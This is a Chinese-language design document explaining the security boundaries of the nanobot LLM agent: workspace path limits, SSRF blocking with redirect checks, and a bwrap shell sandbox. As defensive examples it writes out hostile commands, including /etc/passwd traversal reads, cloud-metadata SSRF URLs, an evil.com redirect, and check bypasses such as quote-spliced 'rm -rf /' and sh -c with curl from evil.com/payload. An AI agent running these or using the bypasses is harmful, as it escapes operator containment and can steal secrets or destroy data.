# 安全边界详解

nanobot 的 Agent 拥有强大的能力（文件读写、Shell 执行、网络请求），因此安全边界至关重要。项目定义了三条红线。

---

## 一、工作区路径限制（Workspace Restriction）

### 问题

Agent 可以执行 `read_file`、`write_file`、`exec` 等工具。如果不限制，LLM 可能被诱导读取 `/etc/passwd`、写入系统关键文件、或通过 `../../../` 路径遍历逃出工作区。

### 防护架构

```
配置层：restrict_to_workspace = true
    ↓
WorkspaceScopeResolver（workspace_access.py）
    ↓  解析出 WorkspaceScope → ToolWorkspace
    ↓  allowed_root = /path/to/workspace（仅当受限时）
    ↓
    ├── 文件工具（filesystem.py）
    │   ├── _resolve_read(path)  → 允许：workspace + media + skills
    │   └── _resolve_write(path) → 允许：workspace + 显式配置的额外写目录
    │
    └── Shell 工具（shell.py）
        ├── working_dir 必须在 workspace 内
        ├── 命令中的绝对路径必须在 workspace 内
        └── 命令中的 ../ 和 ..\ 被拦截
```

### 路径解析流程

```
用户/LLM 请求：read_file("../../etc/passwd")
    ↓
1. Path.resolve() 解析符号链接，得到真实路径
2. 检查路径是否在 allowed_root 下
3. 不在 → 拒绝，返回错误
```

### 读写权限不对称

| 操作 | 允许的路径范围 |
|------|--------------|
| **读** | workspace + media 目录 + skills 目录 |
| **写** | workspace + 显式配置的 extra_write_allowed_dirs/files |

media 目录（用户上传的图片等）可读不可写——防止 Agent 通过写 media 目录绕过限制。

### Shell 工具的额外防护

Shell 工具不仅要限制路径，还要检查命令内容：

```python
# 1. 拒绝危险命令模式
deny_patterns: rm -rf, del /f, format, dd if=, fork bomb, shutdown...

# 2. 拦截内部 URL
# 命令中不能包含内网地址（除非 WebUI full-access 模式）

# 3. 提取命令中的绝对路径并检查
"cat /etc/passwd"  → 提取 /etc/passwd → 不在 workspace → 拒绝

# 4. 拦截路径遍历字面量
"cat ../../etc/passwd"  → 包含 ../ → 拒绝
```

### 两层执行

| 层级 | 机制 | 平台 |
|------|------|------|
| **应用层** | nanobot 自己的路径解析 + 命令检查 | 所有平台 |
| **系统层** | bubblewrap (bwrap) 沙箱 | 仅 Linux（有 bwrap 时） |

Windows 上只有应用层防护——没有进程级隔离，依赖路径检查和命令审查。

---

## 二、SSRF 防护（Server-Side Request Forgery）

### 问题

Agent 可以通过 `web_fetch`、MCP 等工具发起 HTTP 请求。如果不限制，LLM 可能被诱导访问内网服务：

```
web_fetch("http://169.254.169.254/latest/meta-data/")  → AWS 元数据，可能泄露密钥
web_fetch("http://localhost:6379/")                     → 内网 Redis
web_fetch("http://10.0.0.1/admin")                      → 内网管理面板
```

### 防护架构

```
validate_url_target(url)    ← 核心函数（security/network.py）
    ↓
1. 解析 URL，验证 scheme 是 http/https
2. DNS 解析域名 → 得到 IP 地址
3. 检查 IP 是否在 _BLOCKED_NETWORKS 中
4. 任一 IP 在黑名单 → 拒绝
```

### 被阻止的 IP 范围

| CIDR | 含义 | 为什么阻止 |
|------|------|-----------|
| `0.0.0.0/8` | 当前网络 | 可被滥用 |
| `10.0.0.0/8` | RFC1918 私有 | 内网 |
| `100.64.0.0/10` | CGNAT | 内网（如 Tailscale） |
| `127.0.0.0/8` | 回环 | 本机服务 |
| `169.254.0.0/16` | 链路本地 | **云元数据端点**（AWS/GCP/Azure） |
| `172.16.0.0/12` | RFC1918 私有 | 内网 |
| `192.168.0.0/16` | RFC1918 私有 | 内网 |
| `::1/128` | IPv6 回环 | 本机服务 |
| `fc00::/7` | IPv6 ULA | 内网 |
| `fe80::/10` | IPv6 链路本地 | 内网 |

### 白名单机制

```python
configure_ssrf_whitelist(["100.64.0.0/10"])  # 允许 Tailscale
```

典型场景：用户用 Tailscale 组网，`100.64.0.0/10` 默认被阻止（CGNAT 范围），需要显式白名单。

### 重定向安全

HTTP 重定向是 SSRF 的经典绕过手段：

```
web_fetch("https://evil.com/redirect")  → 302 → http://169.254.169.254/...
```

nanobot 的防护：

```python
# 不使用 httpx 的自动重定向
follow_redirects = False

# 手动处理重定向，每一步都验证
for redirect in range(MAX_REDIRECTS):  # 最多 5 次
    response = client.get(url, follow_redirects=False)
    if response.status_code in (301, 302, ...):
        next_url = urljoin(url, response.headers["Location"])
        validate_url_target(next_url)  # ← 验证重定向目标
        url = next_url
```

### MCP 传输的 SSRF 防护

MCP 服务器可以用 SSE 或 Streamable HTTP 传输，同样需要 SSRF 防护：

```python
# 连接前验证 MCP URL
ok, error = validate_url_target(cfg.url)
if not ok:
    # 拒绝连接

# 每个出站请求都验证（通过 httpx event_hooks）
httpx.AsyncClient(
    event_hooks={"request": [_validate_mcp_request_url]}
)
# → 包括重定向后的请求
```

---

## 三、Shell 沙箱

### 问题

应用层的命令检查（deny patterns、路径检查）不是进程级隔离——LLM 可能找到绕过方式：

```bash
# 绕过路径检查
python3 -c "import os; os.system('cat /etc/passwd')"

# 绕过 deny patterns
bash -c "r''m -rf /"   # 拼接绕过

# 通过子进程逃逸
sh -c "$(curl http://evil.com/payload)"
```

### 防护架构

```
有 bwrap（Linux 容器化部署）？
├── 是 → 系统级沙箱
│   └── bwrap 命令包装：
│       --bind /path/to/workspace /workspace  # 只挂载工作区
│       --ro-bind /usr /usr                   # 只读系统文件
│       --unshare-net（可选）                   # 禁止网络
│       --die-with-parent                     # 父进程死则子进程死
│
└── 否 → 应用层防护
    └── Windows / 无 bwrap 的 Linux
        ├── working_dir 限制
        ├── deny patterns
        ├── 路径遍历检查
        └── 绝对路径检查
```

### bwrap 沙箱原理

```
正常执行：
  exec(cmd)  → 子进程可以访问整个文件系统

bwrap 沙箱：
  bwrap \
    --bind /home/user/project /workspace \   # 工作区可读写
    --ro-bind /usr /usr \                    # 系统文件只读
    --ro-bind /lib /lib \                    # 库文件只读
    --dev /dev \                             # 最小设备
    --proc /proc \                           # 最小 proc
    --unshare-user \                         # 用户命名空间隔离
    --unshare-pid \                          # PID 命名空间隔离
    --die-with-parent \                      # 父死子死
    -- cmd                                   # 实际命令
```

子进程看到的文件系统只有 workspace 是可写的，系统目录只读，无法逃逸。

### Windows 的局限

Windows 没有 bwrap 等效工具，只有应用层防护：

| | Linux + bwrap | Windows |
|---|---|---|
| 文件系统隔离 | ✅ 内核级 | ❌ 仅路径检查 |
| 进程隔离 | ✅ 命名空间 | ❌ 无 |
| 网络隔离 | ✅ --unshare-net | ❌ 无 |
| 绕过难度 | 高（需内核漏洞） | 低（需找到命令检查的漏洞） |

这就是 security.md 说的"Windows 只有应用层防护"。

---

## 三条红线的关系

```
Agent 收到用户消息
    ↓
需要读文件？ → 工作区路径限制（红线 1）
    ↓
需要发 HTTP？ → SSRF 防护（红线 2）
    ↓
需要执行命令？ → Shell 沙箱 + 工作区限制（红线 1 + 3）
    ↓
三条红线独立但互补，覆盖了 Agent 的所有危险操作
```

### 设计原则

1. **默认拒绝**：restrict_to_workspace 默认开启，SSRF 黑名单默认全开
2. **显式放行**：白名单、extra_allowed_dirs 都需要显式配置
3. **纵深防御**：应用层 + 系统层双重防护，一层被绕过还有另一层
4. **不可绕过**：security.md 明确规定"任何新路径处理逻辑必须经过 resolver"
